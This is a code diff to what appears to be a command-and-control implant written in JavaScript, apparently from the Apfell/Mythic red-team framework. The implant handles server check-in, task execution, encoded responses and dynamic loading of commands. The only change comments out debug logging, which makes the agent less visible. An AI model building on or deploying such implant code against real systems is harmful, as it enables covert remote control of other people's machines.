@@ -47,7 +47,7 @@ class customC2 extends baseC2{
 
         const encmsg = JSON.stringify(meta);
         connection.send(encmsg);
-        console.log('Sent initial checkin');
+        //console.log('Sent initial checkin');
     }
 
     postResponse(){
@@ -88,7 +88,7 @@ setInterval(function(){
         let encfinal = btoa(unescape(encodeURIComponent(final)));
         out.push(encfinal);
     } else {
-        console.log('Apfell id not set for tasking ' + apfell.apfellid);
+        //console.log('Apfell id not set for tasking ' + apfell.apfellid);
     }
 }, C2.interval * 1000);
 
@@ -129,7 +129,7 @@ connection.onmessage = function (e) {
                     let outer_response = {'action':'post_response','responses':[response], 'delegates':[]};
                     let msg = btoa(unescape(encodeURIComponent(apfell.apfellid + JSON.stringify(outer_response))));
                     out.push(msg);
-                    console.log("Error executing task: " + error.toString());
+                    //console.log("Error executing task: " + error.toString());
                 }
             }
 
@@ -228,7 +228,7 @@ connection.onmessage = function (e) {
                             load.data.push(...raw);
                             let new_dict = default_load(load.data.join(""));
                             commands_dict = Object.assign({}, commands_dict, new_dict);
-                            console.log(Object.values(commands_dict));
+                            //console.log(Object.values(commands_dict));
                             C2.commands = Object.keys(commands_dict);
                             let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
                             let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
